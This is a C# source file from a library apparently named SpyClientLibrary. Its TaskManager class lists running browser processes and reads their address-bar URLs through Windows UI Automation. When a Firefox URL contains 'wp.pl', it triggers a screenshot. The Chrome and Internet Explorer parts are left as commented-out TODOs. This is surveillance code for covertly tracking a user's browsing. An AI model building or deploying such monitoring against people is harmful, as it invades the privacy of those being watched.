using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Automation;

namespace SpyClientLibrary
{
    public class TaskManager
    {
        public List<Process> _chromeProcess;
        public List<Process> _IEProcess;
        public List<Process> _edgeProcess;
        public List<Process> _firefoxProcess;
        public List<Process> _operaProcess;
        public List<String> _openedPages;

        public TaskManager()
        {
            _chromeProcess = new List<Process>();
            _IEProcess = new List<Process>();
            _edgeProcess = new List<Process>();
            _firefoxProcess = new List<Process>();
            _operaProcess = new List<Process>();
            _openedPages = new List<string>();
        }
        public void getOpenPrograms()
        {
            foreach (var p in Process.GetProcessesByName("chrome"))
            {
                // TO DO              

                //var url = GetChromeUrl(p);
                //if (url != null)
                //    _chromeProcess.Add(p);

            }
            foreach (var p in Process.GetProcessesByName("firefox"))
            {
                var url = GetFirefoxUrl(p);
                if (url != null)
                {
                    
                    //_firefoxProcess.Add(p);
                    //_openedPages.Add(url);
                    if(url.IndexOf("wp.pl")>-1)
                    {
                        ScreenShot s1 = new ScreenShot();
                        s1.generateCurrentScreen();
                    }
                }
            }
            foreach (Process p in Process.GetProcessesByName("iexplore"))
            {
                // TO DO

                //string url = GetInternetExplorerUrl(p);
                //if (url != null)
                //    _IEProcess.Add(p);
            }
        }

        public static string GetChromeUrl(Process process)
        {
            if (process == null)
                throw new ArgumentNullException("process");

            if (process.MainWindowHandle == IntPtr.Zero)
                return null;

            AutomationElement element = AutomationElement.FromHandle(process.MainWindowHandle);
            if (element == null)
                return null;

            AutomationElement edit = element.FindFirst(TreeScope.Subtree,
                 new AndCondition(
                      new PropertyCondition(AutomationElement.NameProperty, "address and search bar", PropertyConditionFlags.IgnoreCase),
                      new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Edit)));

            return ((ValuePattern)edit.GetCurrentPattern(ValuePattern.Pattern)).Current.Value as string;
        }
        public static string GetInternetExplorerUrl(Process process)
        {
            if (process == null)
                throw new ArgumentNullException("process");

            if (process.MainWindowHandle == IntPtr.Zero)
                return null;

            AutomationElement element = AutomationElement.FromHandle(process.MainWindowHandle);
            if (element == null)
                return null;

            AutomationElement rebar = element.FindFirst(TreeScope.Children, new PropertyCondition(AutomationElement.ClassNameProperty, "ReBarWindow32"));
            if (rebar == null)
                return null;

            AutomationElement edit = rebar.FindFirst(TreeScope.Subtree, new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Edit));

            return ((ValuePattern)edit.GetCurrentPattern(ValuePattern.Pattern)).Current.Value as string;
        }
        public static string GetFirefoxUrl(Process process)
        {
            try
            {
                if (process.MainWindowHandle == IntPtr.Zero)
                {
                    return null;
                }
                AutomationElement element = AutomationElement.FromHandle(process.MainWindowHandle);
                if (element == null)
                    return null;

                AutomationElement custom1 = element.FindFirst(TreeScope.Descendants,
                 new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Custom));

                AutomationElementCollection custom2 = custom1.FindAll(TreeScope.Children, new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Custom));

                foreach (AutomationElement item in custom2)
                {
                    AutomationElement custom3 = item.FindFirst(TreeScope.Descendants, new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Custom));
                    AutomationElement doc3 = custom3.FindFirst(TreeScope.Descendants, new PropertyCondition(AutomationElement.ControlTypeProperty, ControlType.Document));

                    if (!doc3.Current.IsOffscreen)
                    {
                        return ((ValuePattern)doc3.GetCurrentPattern(ValuePattern.Pattern)).Current.Value as string;
                    }
                }
            }catch(Exception e)
            {
                return null;
            }
            return null;
        }

    }
}